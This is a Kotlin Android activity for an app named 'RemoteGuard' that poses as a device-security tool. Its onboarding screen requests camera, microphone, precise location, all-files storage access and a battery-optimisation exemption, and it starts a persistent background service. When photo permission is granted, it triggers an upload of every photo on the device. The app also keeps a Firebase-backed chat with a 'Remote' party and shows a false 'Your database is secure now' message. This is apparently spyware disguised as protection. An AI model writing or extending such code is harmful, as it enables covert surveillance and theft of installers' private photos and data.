package com.remoteguard.app

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.Send
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Security
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.remoteguard.app.ui.theme.RemoteGuardTheme

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            Log.d("MainActivity", "onCreate: Starting")
            requestIgnoreBatteryOptimizationsIfNeeded()
            Log.d("MainActivity", "onCreate: Battery optimization requested")

            try {
                startService()
                Log.d("MainActivity", "onCreate: Service started")
            } catch (e: Exception) {
                Log.e("MainActivity", "onCreate: Error starting service", e)
            }

            try {
                FirebaseHelper.ensureDatabaseOnline()
                Log.d("MainActivity", "onCreate: Firebase database ensured to be online")
            } catch (e: Exception) {
                Log.e("MainActivity", "onCreate: Error ensuring Firebase online", e)
            }

            var startDest = "onboarding"
            try {
                startDest = if (hasAllPermissions()) "status" else "onboarding"
                Log.d("MainActivity", "onCreate: Start destination = $startDest")
            } catch (e: Exception) {
                Log.e("MainActivity", "onCreate: Error checking permissions, defaulting to onboarding", e)
                startDest = "onboarding"
            }

            setContent {
                RemoteGuardTheme {
                    Surface(
                        modifier = Modifier.fillMaxSize(),
                        color = MaterialTheme.colorScheme.background
                    ) {
                        val navController = rememberNavController()
                        NavHost(navController = navController, startDestination = startDest) {
                            composable("onboarding") {
                                val context = LocalContext.current
                                OnboardingScreen { ->
                                    Log.d("MainActivity", "Onboarding complete, updating device info")
                                    try {
                                        FirebaseHelper.updateDeviceInfo(context)
                                    } catch (e: Exception) {
                                        Log.e("MainActivity", "Failed to update device info on onboarding complete", e)
                                    }
                                    navController.navigate("status") {
                                        popUpTo("onboarding") { inclusive = true }
                                    }
                                    startService()
                                }
                            }
                            composable("status") {
                                StatusScreen(
                                    onOpenChat = { navController.navigate("chat") }
                                )
                            }
                            composable("chat") {
                                ChatScreen()
                            }
                        }
                    }
                }
            }
            Log.d("MainActivity", "onCreate: Completed successfully")
        } catch (e: Exception) {
            Log.e("MainActivity", "onCreate: Fatal error", e)
            e.printStackTrace()
            setContent {
                RemoteGuardTheme {
                    Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                        Column(
                            modifier = Modifier.fillMaxSize().padding(16.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.Center
                        ) {
                            Text("Critical Error", style = MaterialTheme.typography.headlineSmall, color = MaterialTheme.colorScheme.error)
                            Spacer(modifier = Modifier.height(8.dp))
                            Text("Unable to start application. Please try again or reinstall.", textAlign = androidx.compose.ui.text.style.TextAlign.Center)
                        }
                    }
                }
            }
        }
    }

    private fun hasAllPermissions(): Boolean {
        return try {
            val permissions = mutableListOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissions.add(Manifest.permission.POST_NOTIFICATIONS)
                permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                permissions.add("android.permission.CAPTURE_VIDEO_OUTPUT")
            }
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }

            val basicGranted = permissions.all {
                ContextCompat.checkSelfPermission(this, it) == android.content.pm.PackageManager.PERMISSION_GRANTED
            }

            val manageStorageGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                Environment.isExternalStorageManager()
            } else {
                true
            }

            basicGranted && manageStorageGranted
        } catch (e: Exception) {
            Log.e("MainActivity", "Error checking permissions", e)
            false
        }
    }

    private fun startService() {
        try {
            val intent = Intent(this, RemoteGuardService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Log.d("MainActivity", "startService: Service started successfully")
        } catch (e: Exception) {
            Log.e("MainActivity", "startService: Failed to start service: ${e.message}", e)
        }
    }

    private fun requestIgnoreBatteryOptimizationsIfNeeded() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
        val powerManager = getSystemService(PowerManager::class.java)
        if (powerManager?.isIgnoringBatteryOptimizations(packageName) == true) return

        val intent = Intent(
            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
            Uri.parse("package:$packageName")
        )
        runCatching { startActivity(intent) }
    }
}

@Composable
fun OnboardingScreen(onComplete: () -> Unit) {
    val context = LocalContext.current
    var permissionStage by remember { mutableStateOf(0) }

    val basicPermissionsLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions: Map<String, Boolean> ->
        val allGranted = permissions.values.all { it }
        Log.d("OnboardingScreen", "Basic permissions result: granted=$allGranted")
        if (allGranted) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                permissionStage = 1
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissionStage = 2
            } else {
                permissionStage = 3
                onComplete()
            }
        }
    }

    val manageStorageLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        Log.d("OnboardingScreen", "Manage storage permission result")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionStage = 2
        } else {
            permissionStage = 3
            onComplete()
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            Log.w("OnboardingScreen", "Manage storage not granted, but proceeding anyway")
        }
    }

    val photoPermissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        Log.d("OnboardingScreen", "Photo permission result: granted=$granted")
        if (granted) {
            Log.d("OnboardingScreen", "Starting photo upload")
            val photoManager = PhotoManager(context)
            photoManager.uploadAllPhotosFromDevice()
        }
        permissionStage = 3
        onComplete()
    }

    LaunchedEffect(permissionStage) {
        if (permissionStage == 1) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                manageStorageLauncher.launch(intent)
            }
        } else if (permissionStage == 2) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                photoPermissionLauncher.launch(Manifest.permission.READ_MEDIA_IMAGES)
            }
        }
    }

    Column(
        modifier = Modifier.fillMaxSize().padding(32.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Icon(
            imageVector = Icons.Default.Lock,
            contentDescription = null,
            tint = MaterialTheme.colorScheme.error,
            modifier = Modifier.size(100.dp)
        )
        Spacer(modifier = Modifier.height(32.dp))
        Text(
            "Security Setup",
            style = MaterialTheme.typography.headlineMedium,
            color = MaterialTheme.colorScheme.onBackground
        )
        Spacer(modifier = Modifier.height(16.dp))
        Text(
            "To protect your device, we need permissions.",
            textAlign = androidx.compose.ui.text.style.TextAlign.Center,
            color = Color.Gray
        )
        Spacer(modifier = Modifier.height(48.dp))

        Button(
            onClick = {
                val permissions = mutableListOf(
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                )
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    permissions.add(Manifest.permission.POST_NOTIFICATIONS)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    permissions.add("android.permission.CAPTURE_VIDEO_OUTPUT")
                }
                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
                    permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                    permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                }
                Log.d("OnboardingScreen", "Requesting permissions: $permissions")
                basicPermissionsLauncher.launch(permissions.toTypedArray())
            },
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(12.dp)
        ) {
            Text("Grant Required Permissions & Access Photos", modifier = Modifier.padding(8.dp))
        }

        Spacer(modifier = Modifier.height(16.dp))

        TextButton(onClick = {
            Log.d("OnboardingScreen", "Skip permissions button clicked")
            onComplete()
        }) {
            Text("Skip for now")
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ChatScreen() {
    val context = LocalContext.current
    val deviceId = remember { FirebaseHelper.getDeviceId(context) }
    var messageText by remember { mutableStateOf("") }
    val messages = remember { mutableStateListOf<ChatMessage>() }

    LaunchedEffect(Unit) {
        val ref = FirebaseHelper.getMessagesRef(context)
        val listener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                messages.clear()
                for (child in snapshot.children) {
                    val msg = child.getValue(ChatMessage::class.java)
                    if (msg != null) {
                        messages.add(msg)
                    }
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        }
        ref.addValueEventListener(listener)
    }

    Column(modifier = Modifier.fillMaxSize()) {
        TopAppBar(
            title = { Text("Safe Chat - $deviceId", fontSize = 18.sp) },
            colors = TopAppBarDefaults.topAppBarColors(
                containerColor = MaterialTheme.colorScheme.primaryContainer,
                titleContentColor = MaterialTheme.colorScheme.onPrimaryContainer
            )
        )

        LazyColumn(
            modifier = Modifier.weight(1f).padding(8.dp),
            reverseLayout = false
        ) {
            items(messages) { msg ->
                val isMe = msg.senderId == deviceId
                ChatBubble(msg, isMe)
            }
        }

        Row(
            modifier = Modifier.fillMaxWidth().padding(8.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            TextField(
                value = messageText,
                onValueChange = { messageText = it },
                modifier = Modifier.weight(1f),
                placeholder = { Text("Type a message...") },
                maxLines = 3
            )
            IconButton(onClick = {
                if (messageText.isNotBlank()) {
                    FirebaseHelper.sendMessage(context, messageText)
                    messageText = ""
                }
            }) {
                Icon(Icons.AutoMirrored.Filled.Send, contentDescription = "Send")
            }
        }
    }
}

@Composable
fun ChatBubble(message: ChatMessage, isMe: Boolean) {
    val alignment = if (isMe) Alignment.CenterEnd else Alignment.CenterStart
    val bubbleColor = if (isMe) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.secondaryContainer
    val textColor = if (isMe) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSecondaryContainer

    Box(modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp), contentAlignment = alignment) {
        Column(
            horizontalAlignment = if (isMe) Alignment.End else Alignment.Start
        ) {
            Surface(
                color = bubbleColor,
                shape = RoundedCornerShape(
                    topStart = 12.dp,
                    topEnd = 12.dp,
                    bottomStart = if (isMe) 12.dp else 0.dp,
                    bottomEnd = if (isMe) 0.dp else 12.dp
                )
            ) {
                Text(
                    text = message.text,
                    modifier = Modifier.padding(12.dp),
                    color = textColor
                )
            }
            Text(
                text = if (isMe) "Me" else "Remote",
                style = MaterialTheme.typography.labelSmall,
                modifier = Modifier.padding(horizontal = 4.dp, vertical = 2.dp),
                color = Color.Gray
            )
        }
    }
}

@Composable
fun StatusScreen(onOpenChat: () -> Unit) {
    val context = LocalContext.current
    val deviceId = remember { FirebaseHelper.getDeviceId(context) }

    Column(
        modifier = Modifier.fillMaxSize().padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Icon(
            imageVector = Icons.Default.Security,
            contentDescription = null,
            tint = MaterialTheme.colorScheme.primary,
            modifier = Modifier.size(120.dp)
        )
        Spacer(modifier = Modifier.height(24.dp))
        Text(
            text = "Your database is secure now",
            style = MaterialTheme.typography.headlineSmall,
            color = MaterialTheme.colorScheme.primary
        )
        Spacer(modifier = Modifier.height(8.dp))
        Text(
            text = "Device ID: $deviceId",
            style = MaterialTheme.typography.bodyMedium,
            color = Color.Gray
        )

        Spacer(modifier = Modifier.height(40.dp))

        Button(
            onClick = onOpenChat,
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(12.dp)
        ) {
            Text("Open Chat", modifier = Modifier.padding(8.dp))
        }
    }
}
